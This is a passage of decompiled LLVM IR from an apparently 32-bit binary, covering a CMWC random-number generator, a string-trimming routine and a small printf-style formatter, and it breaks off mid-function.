  %v2_80481df = xor i32 %storemerge5, -1640531527
  %v1_80481e1 = xor i32 %v2_80481df, %v2_80481da
  store i32 %v1_80481e1, i32* %eax.global-to-local, align 4
  %v2_80481e6 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e6 = add i32 %v2_80481e6, ptrtoint (i32* @global_var_805a700.7 to i32)
  %v4_80481e6 = inttoptr i32 %v3_80481e6 to i32*
  store i32 %v1_80481e1, i32* %v4_80481e6, align 4
  %v4_80481ed = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481ed, 4096
  br i1 %exitcond, label %dec_label_pc_80481f9, label %dec_label_pc_80481bd

dec_label_pc_80481f9:                             ; preds = %dec_label_pc_80481bd
  %v0_80481fa = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481fa

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481bd, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048217 = load i32, i32* @global_var_805a430.10, align 16
  %v1_804821c = add i32 %v0_8048217, 1
  %v1_804821d = urem i32 %v1_804821c, 4096
  store i32 %v1_804821d, i32* @global_var_805a430.10, align 16
  %v1_804822c = mul nuw nsw i32 %v1_804821d, 4
  %v2_804822c = add i32 %v1_804822c, ptrtoint (i32* @global_var_805a700.7 to i32)
  %v3_804822c = inttoptr i32 %v2_804822c to i32*
  %v4_804822c = load i32, i32* %v3_804822c, align 4
  %v7_8048249 = udiv i32 %v4_804822c, 228675
  store i32 %v7_8048249, i32* @global_var_805a42c.11, align 4
  br i1 true, label %dec_label_pc_8048299, label %dec_label_pc_804828b

dec_label_pc_804828b:                             ; preds = %entry
  br label %dec_label_pc_8048299

dec_label_pc_8048299:                             ; preds = %entry, %dec_label_pc_804828b
  %v1_80482ae = mul nuw nsw i32 %v1_804821d, 4
  %v2_80482ae = add i32 %v1_80482ae, ptrtoint (i32* @global_var_805a700.7 to i32)
  %v3_80482ae = inttoptr i32 %v2_80482ae to i32*
  %v4_80482ae = load i32, i32* %v3_80482ae, align 4
  ret i32 %v4_80482ae

; uselistorder directives
  uselistorder i32 %v1_804821d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048299, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80482be = load i32, i32* @edi, align 4
  store i32 %v0_80482be, i32* %stack_var_-8, align 4
  %v4_80482c9 = ptrtoint i8* %arg1 to i32
  store i1 false, i1* @df, align 1
  %v3_80482da = call i32 @_strlen(i8* %arg1)
  %v1_80482e1 = add i32 %v3_80482da, -1
  br label %dec_label_pc_80482ea

dec_label_pc_80482e7:                             ; preds = %dec_label_pc_80482ea
  %v4_80482e7 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482ea

dec_label_pc_80482ea:                             ; preds = %entry, %dec_label_pc_80482e7
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e7, %dec_label_pc_80482e7 ]
  %v6_80482ed = add i32 %stack_var_-16.0, %v4_80482c9
  %v1_80482f0 = inttoptr i32 %v6_80482ed to i8*
  %v2_80482f0 = load i8, i8* %v1_80482f0, align 1
  %v2_80482f3 = sext i8 %v2_80482f0 to i32
  %v1_80482f9 = call i32 @isspace(i32 %v2_80482f3)
  %v1_80482fe = icmp eq i32 %v1_80482f9, 0
  %v1_8048300 = icmp eq i1 %v1_80482fe, false
  br i1 %v1_8048300, label %dec_label_pc_80482e7, label %dec_label_pc_8048307.preheader

dec_label_pc_8048307.preheader:                   ; preds = %dec_label_pc_80482ea
  %v5_804830d18 = icmp slt i32 %v1_80482e1, %stack_var_-16.0
  br i1 %v5_804830d18, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_8048304:                             ; preds = %dec_label_pc_804830f
  %v4_8048304 = add i32 %stack_var_-12.019, -1
  %v5_804830d = icmp slt i32 %v4_8048304, %stack_var_-16.0
  br i1 %v5_804830d, label %dec_label_pc_8048327, label %dec_label_pc_804830f

dec_label_pc_804830f:                             ; preds = %dec_label_pc_8048307.preheader, %dec_label_pc_8048304
  %stack_var_-12.019 = phi i32 [ %v4_8048304, %dec_label_pc_8048304 ], [ %v1_80482e1, %dec_label_pc_8048307.preheader ]
  %v6_8048312 = add i32 %stack_var_-12.019, %v4_80482c9
  %v1_8048315 = inttoptr i32 %v6_8048312 to i8*
  %v2_8048315 = load i8, i8* %v1_8048315, align 1
  %v2_8048318 = sext i8 %v2_8048315 to i32
  %v1_804831e = call i32 @isspace(i32 %v2_8048318)
  %v1_8048323 = icmp eq i32 %v1_804831e, 0
  %v1_8048325 = icmp eq i1 %v1_8048323, false
  br i1 %v1_8048325, label %dec_label_pc_8048304, label %dec_label_pc_8048327

dec_label_pc_8048327:                             ; preds = %dec_label_pc_8048304, %dec_label_pc_804830f, %dec_label_pc_8048307.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_80482e1, %dec_label_pc_8048307.preheader ], [ %stack_var_-12.019, %dec_label_pc_804830f ], [ %v4_8048304, %dec_label_pc_8048304 ]
  br label %dec_label_pc_804834a

dec_label_pc_804832f:                             ; preds = %dec_label_pc_804834a
  %v6_804833f = add i32 %storemerge, %v4_80482c9
  %v1_8048342 = inttoptr i32 %v6_804833f to i8*
  %v2_8048342 = load i8, i8* %v1_8048342, align 1
  %v3_8048345 = inttoptr i32 %v6_804835a to i8*
  store i8 %v2_8048342, i8* %v3_8048345, align 1
  %v4_8048347 = add i32 %storemerge, 1
  br label %dec_label_pc_804834a

dec_label_pc_804834a:                             ; preds = %dec_label_pc_8048327, %dec_label_pc_804832f
  %storemerge = phi i32 [ %v4_8048347, %dec_label_pc_804832f ], [ %stack_var_-16.0, %dec_label_pc_8048327 ]
  %v7_8048350 = icmp sgt i32 %storemerge, %stack_var_-12.0.lcssa
  %v2_8048358 = sub i32 %storemerge, %stack_var_-16.0
  %v6_804835a = add i32 %v2_8048358, %v4_80482c9
  br i1 %v7_8048350, label %dec_label_pc_8048352, label %dec_label_pc_804832f

dec_label_pc_8048352:                             ; preds = %dec_label_pc_804834a
  %v22_804835a = inttoptr i32 %v6_804835a to i8*
  store i8 0, i8* %v22_804835a, align 1
  %v2_8048363 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048363, i32* @edi, align 4
  ret i32 %v6_804835a

; uselistorder directives
  uselistorder i32 %storemerge, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-12.019, { 0, 2, 1 }
  uselistorder i32 %v1_80482e1, { 2, 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804834a, { 1, 0 }
  uselistorder label %dec_label_pc_8048327, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830f, { 1, 0 }
  uselistorder label %dec_label_pc_80482ea, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_80483a6

dec_label_pc_804838b:                             ; preds = %entry
  %v3_80483a1 = bitcast i8* %stack_var_8 to i32*
  %v4_80483a1 = call i32 @__libc_write(i32 1, i32* %v3_80483a1, i32 1)
  br label %dec_label_pc_80483a6

dec_label_pc_80483a6:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_80483a7 = phi i32 [ %tmp5, %dec_label_pc_8048372 ], [ %v4_80483a1, %dec_label_pc_804838b ]
  ret i32 %v0_80483a7

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_80483a6, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp13 = icmp slt i32 %arg3, 1
  br i1 %tmp13, label %dec_label_pc_8048409, label %dec_label_pc_80483c2

dec_label_pc_80483c2:                             ; preds = %entry
  %v4_80483c9 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c9, i32* @edx, align 4
  %v2_80483da45 = load i8, i8* %arg2, align 1
  %v4_80483dd47 = icmp eq i8 %v2_80483da45, 0
  %v1_80483df49 = icmp eq i1 %v4_80483dd47, false
  br i1 %v1_80483df49, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483d1:                             ; preds = %dec_label_pc_80483c2, %dec_label_pc_80483d1
  %v4_80483d751 = phi i32 [ %v5_80483d4, %dec_label_pc_80483d1 ], [ %v4_80483c9, %dec_label_pc_80483c2 ]
  %stack_var_-12.050 = phi i32 [ %v4_80483d1, %dec_label_pc_80483d1 ], [ 0, %dec_label_pc_80483c2 ]
  %v4_80483d1 = add i32 %stack_var_-12.050, 1
  %v5_80483d4 = add i32 %v4_80483d751, 1
  %v22_80483d4 = inttoptr i32 %v5_80483d4 to i8*
  store i32 %v5_80483d4, i32* @edx, align 4
  %v2_80483da = load i8, i8* %v22_80483d4, align 1
  %v4_80483dd = icmp eq i8 %v2_80483da, 0
  %v1_80483df = icmp eq i1 %v4_80483dd, false
  br i1 %v1_80483df, label %dec_label_pc_80483d1, label %dec_label_pc_80483e1

dec_label_pc_80483e1:                             ; preds = %dec_label_pc_80483d1, %dec_label_pc_80483c2
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483c2 ], [ %v4_80483d1, %dec_label_pc_80483d1 ]
  %v5_80483e7 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483e7, label %dec_label_pc_80483f2, label %dec_label_pc_80483f8

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483e1
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483f5 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483f8

dec_label_pc_80483f8:                             ; preds = %dec_label_pc_80483e1, %dec_label_pc_80483f2
  %storemerge = phi i32 [ %v5_80483f5, %dec_label_pc_80483f2 ], [ 0, %dec_label_pc_80483e1 ]
  %v1_80483fb = and i32 %arg4, 2
  %tmp14 = mul nuw nsw i32 %v1_80483fb, 8
  %tmp15 = or i32 %tmp14, 32
  br label %dec_label_pc_8048409

dec_label_pc_8048409:                             ; preds = %dec_label_pc_80483f8, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483f8 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp15, %dec_label_pc_80483f8 ]
  %v1_804840c = urem i32 %arg4, 2
  %v2_804840c = icmp eq i32 %v1_804840c, 0
  %v1_8048411 = icmp eq i1 %v2_804840c, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048411, label %dec_label_pc_8048453.preheader, label %dec_label_pc_804842d.preheader

dec_label_pc_804842d.preheader:                   ; preds = %dec_label_pc_8048409
  %tmp1638 = icmp slt i32 %stack_var_12.0, 1
  %tmp1739 = icmp eq i1 %tmp1638, false
  br i1 %tmp1739, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048415:                             ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415
  %stack_var_-20.041 = phi i32 [ %v4_8048427, %dec_label_pc_8048415 ], [ 0, %dec_label_pc_804842d.preheader ]
  %stack_var_12.140 = phi i32 [ %v4_804842a, %dec_label_pc_8048415 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ]
  %v3_8048422 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048427 = add i32 %stack_var_-20.041, 1
  %v4_804842a = add i32 %stack_var_12.140, -1
  %tmp16 = icmp slt i32 %v4_804842a, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_8048415, label %dec_label_pc_8048453.preheader

dec_label_pc_8048453.preheader:                   ; preds = %dec_label_pc_804842d.preheader, %dec_label_pc_8048415, %dec_label_pc_8048409
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048409 ], [ %stack_var_12.0, %dec_label_pc_804842d.preheader ], [ %v4_804842a, %dec_label_pc_8048415 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048409 ], [ 0, %dec_label_pc_804842d.preheader ], [ %v4_8048427, %dec_label_pc_8048415 ]
  %v4_804845326 = ptrtoint i8* %arg2 to i32
  %v2_804845627 = load i8, i8* %arg2, align 1
  %v4_804845929 = icmp eq i8 %v2_804845627, 0
  %v1_804845b31 = icmp eq i1 %v4_804845929, false
  br i1 %v1_804845b31, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048435:                             ; preds = %dec_label_pc_8048453.preheader, %dec_label_pc_8048435
  %v4_804845334 = phi i32 [ %v5_8048450, %dec_label_pc_8048435 ], [ %v4_804845326, %dec_label_pc_8048453.preheader ]
  %stack_var_-20.133 = phi i32 [ %v4_804844d, %dec_label_pc_8048435 ], [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ]
  %stack_var_8.032 = phi i8* [ %v22_8048450, %dec_label_pc_8048435 ], [ %arg2, %dec_label_pc_8048453.preheader ]
  %v2_8048438 = load i8, i8* %stack_var_8.032, align 1
  %v3_8048438 = zext i8 %v2_8048438 to i32
  %v3_8048448 = call i32 @printchar(i32* %.pre, i32 %v3_8048438)
  %v4_804844d = add i32 %stack_var_-20.133, 1
  %v5_8048450 = add i32 %v4_804845334, 1
  %v22_8048450 = inttoptr i32 %v5_8048450 to i8*
  %v2_8048456 = load i8, i8* %v22_8048450, align 1
  %v4_8048459 = icmp eq i8 %v2_8048456, 0
  %v1_804845b = icmp eq i1 %v4_8048459, false
  br i1 %v1_804845b, label %dec_label_pc_8048435, label %dec_label_pc_8048477.preheader

dec_label_pc_8048477.preheader:                   ; preds = %dec_label_pc_8048435, %dec_label_pc_8048453.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8048453.preheader ], [ %v4_804844d, %dec_label_pc_8048435 ]
  %tmp1822 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp1923 = icmp eq i1 %tmp1822, false
  br i1 %tmp1923, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804845f:                             ; preds = %dec_label_pc_8048477.preheader, %dec_label_pc_804845f
  %stack_var_-20.225 = phi i32 [ %v4_8048471, %dec_label_pc_804845f ], [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ]
  %stack_var_12.324 = phi i32 [ %v4_8048474, %dec_label_pc_804845f ], [ %stack_var_12.2.ph, %dec_label_pc_8048477.preheader ]
  %v3_804846c = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048471 = add i32 %stack_var_-20.225, 1
  %v4_8048474 = add i32 %stack_var_12.324, -1
  %tmp18 = icmp slt i32 %v4_8048474, 1
  %tmp19 = icmp eq i1 %tmp18, false
  br i1 %tmp19, label %dec_label_pc_804845f, label %dec_label_pc_804847d

dec_label_pc_804847d:                             ; preds = %dec_label_pc_804845f, %dec_label_pc_8048477.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048477.preheader ], [ %v4_8048471, %dec_label_pc_804845f ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048474, { 1, 0 }
  uselistorder i8* %v22_8048450, { 1, 0 }
  uselistorder i32 %v5_8048450, { 1, 0 }
  uselistorder i32 %v4_804842a, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483d4, { 1, 2, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_804845f, { 1, 0 }
  uselistorder label %dec_label_pc_8048435, { 1, 0 }
  uselistorder label %dec_label_pc_8048453.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048415, { 1, 0 }
  uselistorder label %dec_label_pc_80483f8, { 1, 0 }
  uselistorder label %dec_label_pc_80483d1, { 1, 0 }
}

define i32 @printi(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_8048496 = trunc i64 %arg2 to i32
  %v5_804849c = icmp eq i32 %v4_8048496, 0
  %v6_804849c = icmp slt i32 %v4_8048496, 0
  %v1_80484a0 = icmp eq i1 %v5_804849c, false
  br i1 %v1_80484a0, label %dec_label_pc_80484d2, label %dec_label_pc_80484a2

dec_label_pc_80484a2:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp42 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484c5 = call i32 @prints(i32 %arg1, i8* %tmp42, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_80485bc

dec_label_pc_80484d2:                             ; preds = %entry
  %v4_80484d2 = icmp eq i32 %arg4, 0
  br i1 %v4_80484d2, label %dec_label_pc_80484f3, label %dec_label_pc_80484d8

dec_label_pc_80484d8:                             ; preds = %dec_label_pc_80484d2
  %v13_80484d8 = icmp eq i32 %arg3, 10
  %v1_80484dc = icmp eq i1 %v13_80484d8, false
  br i1 %v1_80484dc, label %dec_label_pc_80484f3, label %dec_label_pc_80484de

dec_label_pc_80484de:                             ; preds = %dec_label_pc_80484d8
  %v1_80484e2 = icmp eq i1 %v6_804849c, false
  br i1 %v1_80484e2, label %dec_label_pc_80484f3, label %dec_label_pc_80484e4

dec_label_pc_80484e4:                             ; preds = %dec_label_pc_80484de
  %v1_80484ee = sub i32 0, %v4_8048496
  %v5_80484f0 = sext i32 %v1_80484ee to i64
  br label %dec_label_pc_80484f3

dec_label_pc_80484f3:                             ; preds = %dec_label_pc_80484de, %dec_label_pc_80484d8, %dec_label_pc_80484d2, %dec_label_pc_80484e4
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_80484d2 ], [ %arg2, %dec_label_pc_80484d8 ], [ %arg2, %dec_label_pc_80484de ], [ %v5_80484f0, %dec_label_pc_80484e4 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484d2 ], [ 0, %dec_label_pc_80484d8 ], [ 0, %dec_label_pc_80484de ], [ 1, %dec_label_pc_80484e4 ]
  %tmp43 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp43, align 4
  %v4_80485548 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485549 = icmp eq i32 %v4_80485548, 0
  %v1_804855816 = icmp eq i1 %v5_80485549, false
  br i1 %v1_804855816, label %dec_label_pc_8048504.lr.ph, label %dec_label_pc_804855a

dec_label_pc_8048504.lr.ph:                       ; preds = %dec_label_pc_80484f3
  %v5_8048507 = sext i32 %arg3 to i64
  br label %dec_label_pc_8048504

dec_label_pc_8048504:                             ; preds = %dec_label_pc_8048504.lr.ph, %dec_label_pc_804852c
  %stack_var_-24.118 = phi i64 [ %stack_var_-24.0, %dec_label_pc_8048504.lr.ph ], [ %v5_8048551, %dec_label_pc_804852c ]
  %stack_var_-40.017 = phi i8* [ %tmp43, %dec_label_pc_8048504.lr.ph ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v6_8048512 = and i64 %stack_var_-24.118, 4294967295
  %v12_8048512 = udiv i64 %v6_8048512, %v5_8048507
  %v13_8048512 = trunc i64 %v12_8048512 to i32
  %v14_8048512 = urem i64 %v6_8048512, %v5_8048507
  %v5_8048517 = trunc i64 %v14_8048512 to i8
  %v7_804851e = icmp sgt i8 %v5_8048517, 9
  br i1 %v7_804851e, label %dec_label_pc_8048520, label %dec_label_pc_804852c

dec_label_pc_8048520:                             ; preds = %dec_label_pc_8048504
  %tmp = trunc i64 %v14_8048512 to i32
  %v5_8048523 = add i32 %tmp, %arg7
  %v1_8048526 = add i32 %v5_8048523, 198
  %v11_8048526 = trunc i32 %v1_8048526 to i8
  br label %dec_label_pc_804852c

dec_label_pc_804852c:                             ; preds = %dec_label_pc_8048504, %dec_label_pc_8048520
  %stack_var_-36.0 = phi i8 [ %v11_8048526, %dec_label_pc_8048520 ], [ %v5_8048517, %dec_label_pc_8048504 ]
  %v4_804852c = ptrtoint i8* %stack_var_-40.017 to i32
  %v5_804852c = add i32 %v4_804852c, -1
  %v22_804852c = inttoptr i32 %v5_804852c to i8*
  %v2_8048533 = add i8 %stack_var_-36.0, 48
  store i8 %v2_8048533, i8* %v22_804852c, align 1
  %v5_8048551 = sext i32 %v13_8048512 to i64
  %v5_8048554 = icmp eq i32 %v13_8048512, 0
  %v1_8048558 = icmp eq i1 %v5_8048554, false
  br i1 %v1_8048558, label %dec_label_pc_8048504, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_804852c, %dec_label_pc_80484f3
  %stack_var_-40.0.lcssa = phi i8* [ %tmp43, %dec_label_pc_80484f3 ], [ %v22_804852c, %dec_label_pc_804852c ]
  %v4_804855a = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_804855a, label %dec_label_pc_8048594, label %dec_label_pc_8048560

dec_label_pc_8048560:                             ; preds = %dec_label_pc_804855a
  %v4_8048560 = icmp eq i32 %arg5, 0
  br i1 %v4_8048560, label %dec_label_pc_804858b, label %dec_label_pc_8048566

dec_label_pc_8048566:                             ; preds = %dec_label_pc_8048560
  %v1_8048569 = and i32 %arg6, 2
  %v2_8048569 = icmp eq i32 %v1_8048569, 0
  br i1 %v2_8048569, label %dec_label_pc_804858b, label %dec_label_pc_8048570

dec_label_pc_8048570:                             ; preds = %dec_label_pc_8048566
  %v3_804857e = inttoptr i32 %arg1 to i32*
  %v4_804857e = call i32 @printchar(i32* %v3_804857e, i32 45)
  %v4_8048586 = add i32 %arg5, -1
  br label %dec_label_pc_8048594

dec_label_pc_804858b:                             ; preds = %dec_label_pc_8048566, %dec_label_pc_8048560
  %v4_804858b = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_804858b = add i32 %v4_804858b, -1
  %v22_804858b = inttoptr i32 %v5_804858b to i8*
  store i8 45, i8* %v22_804858b, align 1
  br label %dec_label_pc_8048594

dec_label_pc_8048594:                             ; preds = %dec_label_pc_804855a, %dec_label_pc_8048570, %dec_label_pc_804858b
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_804855a ], [ %arg5, %dec_label_pc_804858b ], [ %v4_8048586, %dec_label_pc_8048570 ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_804855a ], [ %v22_804858b, %dec_label_pc_804858b ], [ %stack_var_-40.0.lcssa, %dec_label_pc_8048570 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804855a ], [ 0, %dec_label_pc_804858b ], [ 1, %dec_label_pc_8048570 ]
  %v6_80485af = call i32 @prints(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_80485b7 = add i32 %v6_80485af, %stack_var_-28.0
  store i32 %v2_80485b7, i32* @edx, align 4
  br label %dec_label_pc_80485bc

dec_label_pc_80485bc:                             ; preds = %dec_label_pc_80484a2, %dec_label_pc_8048594
  %storemerge = phi i32 [ %v2_80485b7, %dec_label_pc_8048594 ], [ %v6_80484c5, %dec_label_pc_80484a2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_804852c, { 0, 2, 1 }
  uselistorder i8 %v5_8048517, { 1, 0 }
  uselistorder i64 %v6_8048512, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485bc, { 1, 0 }
  uselistorder label %dec_label_pc_8048594, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804852c, { 1, 0 }
  uselistorder label %dec_label_pc_8048504, { 1, 0 }
  uselistorder label %dec_label_pc_80484f3, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80485c1 = load i32, i32* @ebp, align 4
  store i32 %v0_80485c1, i32* %stack_var_-4, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.435 = inttoptr i32 %arg2 to i8*
  %v2_804887536 = load i8, i8* %stack_var_8.435, align 1
  %v4_804887838 = icmp eq i8 %v2_804887536, 0
  %v1_804887a40 = icmp eq i1 %v4_804887838, false
  br i1 %v1_804887a40, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_80485d3:                             ; preds = %entry, %dec_label_pc_804886f
  %stack_var_8.444 = phi i8* [ %stack_var_8.4, %dec_label_pc_804886f ], [ %stack_var_8.435, %entry ]
  %stack_var_-28.143 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804886f ], [ 0, %entry ]
  %stack_var_12.142 = phi i32 [ %stack_var_12.0, %dec_label_pc_804886f ], [ %arg3, %entry ]
  %stack_var_8.4.in41 = phi i32 [ %v5_804886f, %dec_label_pc_804886f ], [ %arg2, %entry ]
  %v2_80485d6 = load i8, i8* %stack_var_8.444, align 1
  %v10_80485d9 = icmp eq i8 %v2_80485d6, 37
  %v1_80485db = icmp eq i1 %v10_80485d9, false
  br i1 %v1_80485db, label %dec_label_pc_8048854, label %dec_label_pc_80485e1

dec_label_pc_80485e1:                             ; preds = %dec_label_pc_80485d3
  %v5_80485e1 = add i32 %stack_var_8.4.in41, 1
  %v22_80485e1 = inttoptr i32 %v5_80485e1 to i8*
  %v2_80485f4 = load i8, i8* %v22_80485e1, align 1
  %v4_80485f7 = icmp eq i8 %v2_80485f4, 0
  br i1 %v4_80485f7, label %dec_label_pc_8048880, label %dec_label_pc_80485ff

dec_label_pc_80485ff:                             ; preds = %dec_label_pc_80485e1
  %v2_8048602 = load i8, i8* %v22_80485e1, align 1
  %v10_8048605 = icmp eq i8 %v2_8048602, 37
  br i1 %v10_8048605, label %dec_label_pc_8048854, label %dec_label_pc_804860d

dec_label_pc_804860d:                             ; preds = %dec_label_pc_80485ff
  %v2_8048610 = load i8, i8* %v22_80485e1, align 1
  %v10_8048613 = icmp eq i8 %v2_8048610, 45
  %v1_8048615 = icmp eq i1 %v10_8048613, false
  br i1 %v1_8048615, label %dec_label_pc_804862a.preheader, label %dec_label_pc_8048617

dec_label_pc_8048617:                             ; preds = %dec_label_pc_804860d
  %v5_8048617 = add i32 %stack_var_8.4.in41, 2
  %v22_8048617 = inttoptr i32 %v5_8048617 to i8*
  br label %dec_label_pc_804862a.preheader

dec_label_pc_804862a.preheader:                   ; preds = %dec_label_pc_8048617, %dec_label_pc_804860d
  %stack_var_8.0.ph = phi i8* [ %v22_80485e1, %dec_label_pc_804860d ], [ %v22_8048617, %dec_label_pc_8048617 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804860d ], [ 1, %dec_label_pc_8048617 ]
  %v4_804862a22 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_804862d23 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_804863030 = icmp eq i8 %v2_804862d23, 48
  br i1 %v7_804863030, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048623:                             ; preds = %dec_label_pc_804862a.preheader, %dec_label_pc_8048623
  %v4_804862a33 = phi i32 [ %v5_8048623, %dec_label_pc_8048623 ], [ %v4_804862a22, %dec_label_pc_804862a.preheader ]
  %stack_var_-32.032 = phi i32 [ %v4_8048626, %dec_label_pc_8048623 ], [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ]
  %v5_8048623 = add i32 %v4_804862a33, 1
  %v22_8048623 = inttoptr i32 %v5_8048623 to i8*
  %v4_8048626 = or i32 %stack_var_-32.032, 2
  %v2_804862d = load i8, i8* %v22_8048623, align 1
  %v7_8048630 = icmp eq i8 %v2_804862d, 48
  br i1 %v7_8048630, label %dec_label_pc_8048623, label %dec_label_pc_8048659.preheader

dec_label_pc_8048659.preheader:                   ; preds = %dec_label_pc_8048623, %dec_label_pc_804862a.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804862a.preheader ], [ %v22_8048623, %dec_label_pc_8048623 ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804862a.preheader ], [ %v4_8048626, %dec_label_pc_8048623 ]
